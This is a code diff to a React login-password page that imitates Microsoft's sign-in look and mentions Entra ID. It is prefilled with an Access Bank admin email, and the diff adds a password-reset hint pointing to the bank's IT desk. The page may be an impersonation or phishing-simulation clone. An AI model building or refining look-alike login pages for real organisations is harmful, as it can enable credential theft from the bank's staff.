@@ -7,6 +7,7 @@ export default function LoginPasswordPage() {
   const location = useLocation();
   const email = (location.state as { email?: string } | null)?.email || "admin@accessbankplc.com";
   const [password, setPassword] = useState("");
+  const [forgotPasswordHint, setForgotPasswordHint] = useState(false);
 
   const signIn = () => {
     if (!password) return;
@@ -41,9 +42,17 @@ export default function LoginPasswordPage() {
             className="w-full border-0 border-b border-[#666] focus:border-b-2 focus:border-[#0067b8] outline-none font-['Segoe_UI',sans-serif] text-sm text-[#1b1b1b] placeholder-[#5e5e5e] py-2 mb-3.5 bg-transparent"
           />
 
-          <button className="font-['Segoe_UI',sans-serif] text-sm text-[#0067b8] hover:underline">
+          <button
+            onClick={() => setForgotPasswordHint(true)}
+            className="font-['Segoe_UI',sans-serif] text-sm text-[#0067b8] hover:underline"
+          >
             Forgot my password
           </button>
+          {forgotPasswordHint && (
+            <p className="font-['Segoe_UI',sans-serif] text-xs text-[#5e5e5e] mt-2">
+              Password resets are managed by Access Bank IT. Contact the IT service desk to reset your Entra ID password.
+            </p>
+          )}
 
           <div className="flex justify-end mt-9">
             <button
